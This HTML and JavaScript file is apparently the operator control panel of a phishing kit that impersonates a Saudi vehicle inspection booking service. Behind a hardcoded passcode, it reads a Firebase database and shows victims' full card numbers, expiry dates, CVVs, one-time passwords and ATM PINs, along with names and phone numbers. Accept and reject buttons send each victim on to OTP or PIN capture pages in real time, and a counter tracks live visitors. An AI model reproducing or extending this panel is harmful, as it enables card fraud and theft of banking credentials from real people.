<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE_CONTROL_v4</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --p-clr: #006C35; --b-clr: #f4f7f6; --a-clr: #00ff88; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--b-clr); margin: 0; overflow-x: auto; user-select: none; }
        .h-nav { background: var(--p-clr); padding: 10px; text-align: center; position: sticky; top: 0; z-index: 99; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
        .l-cnt { color: var(--a-clr); font-weight: bold; font-size: 13px; margin-bottom: 5px; border: 1px solid var(--a-clr); display: inline-block; padding: 2px 10px; border-radius: 15px; }
        .t-wrap { display: flex; gap: 8px; justify-content: center; }
        .t-btn { padding: 8px 20px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.1); color: white; border-radius: 5px; cursor: pointer; font-size: 12px; }
        .t-btn.active { background: #fff; color: var(--p-clr); font-weight: bold; }
        .main-c { padding: 10px; min-width: 1200px; }
        .r-row { background: #fff; border-radius: 4px; padding: 10px; margin-bottom: 5px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 2px rgba(0,0,0,0.1); gap: 15px; border-right: 5px solid #ddd; }
        .c-box { display: flex; flex-direction: column; }
        .lbl { font-size: 9px; color: #aaa; text-transform: uppercase; }
        .val { font-size: 14px; font-weight: bold; color: #222; white-space: nowrap; }
        .c-num { direction: ltr; font-family: monospace; font-size: 16px; color: #856404; background: #fffcf0; padding: 4px 10px; border-radius: 3px; border: 1px solid #fcebb6; font-weight: bold; letter-spacing: 1px; }
        .o-v { color: #004085; background: #e7f3ff; padding: 4px 8px; border-radius: 3px; border: 1px solid #cce5ff; }
        .p-v { color: #721c24; background: #f8d7da; padding: 4px 8px; border-radius: 3px; border: 1px solid #f5c6cb; }
        .act { display: flex; gap: 4px; }
        .b-x { border: none; border-radius: 3px; padding: 8px 15px; color: #fff; font-weight: bold; cursor: pointer; font-size: 11px; }
        .b-ok { background: #28a745; }
        .b-no { background: #dc3545; }
        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .p-in { padding: 12px; border-radius: 8px; border: 1px solid #333; margin-top: 15px; text-align: center; width: 250px; background: #222; color: #fff; font-size: 18px; letter-spacing: 2px; }
    </style>
</head>
<body>

<div id="l-scr">
    <h3>ADMIN ACCESS PORTAL</h3>
    <p style="font-size: 12px; color: #666;">ENTER SECURITY CODE TO UNLOCK SYSTEM</p>
    <input type="password" class="p-in" id="p-key" placeholder="••••••••" oninput="_v_auth(this.value)">
</div>

<audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

<div class="h-nav">
    <div class="l-cnt">LIVE TRAFFIC: <span id="_online">0</span></div>
    <div class="t-wrap">
        <button class="t-btn active" onclick="_tab(event, 'sec_1')">CARDS MONITOR</button>
        <button class="t-btn" onclick="_tab(event, 'sec_2')">PERSONAL DATA</button>
    </div>
</div>

<div class="main-c">
    <div id="sec_1" class="tab-content" style="display: block;">
        <div id="_p_list"></div>
    </div>
    <div id="sec_2" class="tab-content" style="display: none;">
        <div id="_b_list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 10px;"></div>
    </div>
</div>

<script>
    // تهيئة النظام المشفر
    const _cfg = { 
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
        projectId: "saso-inspection" 
    };
    firebase.initializeApp(_cfg);
    const _db = firebase.database();

    // التحقق من الهوية باستخدام الكود الخاص بك
    function _v_auth(v) {
        if(v === "H1234567890H") { 
            document.getElementById('l-scr').style.fadeOut = "slow";
            document.getElementById('l-scr').style.display = 'none';
        }
    }

    // مراقبة السطر الموحد - LTR للأرقام
    _db.ref('orders').on('value', (s) => {
        const _l = document.getElementById('_p_list');
        _l.innerHTML = '';
        if(s.exists()) document.getElementById('_notif').play().catch(e=>{});
        
        s.forEach((c) => {
            const _d = c.val();
            const _i = c.key;
            const _c = _d.card_details || {};
            
            _l.innerHTML += `
                <div class="r-row" style="border-right-color: ${_d.next_step ? '#28a745' : '#ccc'}">
                    <div class="c-box" style="width: 150px;">
                        <span class="lbl">Holder / Page</span>
                        <span class="val">${_c.holder_name || '...'} <small style="color:var(--p-clr)">(${_d.current_page || 'Index'})</small></span>
                    </div>
                    <div class="c-box">
                        <span class="lbl">Card Sequence</span>
                        <span class="c-num">${_c.card_number || '**** **** **** ****'}</span>
                    </div>
                    <div class="c-box" style="width: 100px; text-align: center;">
                        <span class="lbl">EXP / CVV</span>
                        <span class="val" style="direction:ltr;">${_c.expiry || '--/--'} | ${_c.cvv || '***'}</span>
                    </div>
                    <div class="c-box" style="width: 80px; text-align: center;">
                        <span class="lbl">TOKEN</span>
                        <span class="val o-v">${_c.otp || '----'}</span>
                    </div>
                    <div class="c-box" style="width: 80px; text-align: center;">
                        <span class="lbl">AUTH PIN</span>
                        <span class="val p-v">${_c.atm_pin || '----'}</span>
                    </div>
                    <div class="act">
                        <button class="b-x b-ok" onclick="_u_st('${_i}', 'go_to_otp')">ACCEPT ✅</button>
                        <button class="b-x b-no" onclick="_u_st('${_i}', 'go_to_pin')">REJECT ❌</button>
                    </div>
                </div>`;
        });
    });

    _db.ref('bookings').on('value', (s) => {
        const _b = document.getElementById('_b_list');
        _b.innerHTML = '';
        s.forEach(c => {
            const d = c.val();
            _b.innerHTML += `<div style="background:#fff; padding:12px; border-radius:5px; border-right:4px solid var(--p-clr)">
                <span class="val">${d.name}</span><br><small>${d.phone} | ${d.car_type}</small>
            </div>`;
        });
    });

    function _u_st(i, s) {
        _db.ref('orders/' + i).update({ next_step: s, ts: Date.now() });
    }

    function _tab(e, n) {
        document.querySelectorAll('.tab-content').forEach(x => x.style.display = 'none');
        document.querySelectorAll('.t-btn').forEach(x => x.classList.remove('active'));
        document.getElementById(n).style.display = 'block';
        e.currentTarget.classList.add('active');
    }

    _db.ref('live_sessions').on('value', (s) => {
        let c = 0; const n = Date.now();
        s.forEach(x => { if(n - x.val().last_seen < 25000) c++; });
        document.getElementById('_online').innerText = c;
    });
</script>
</body>
</html>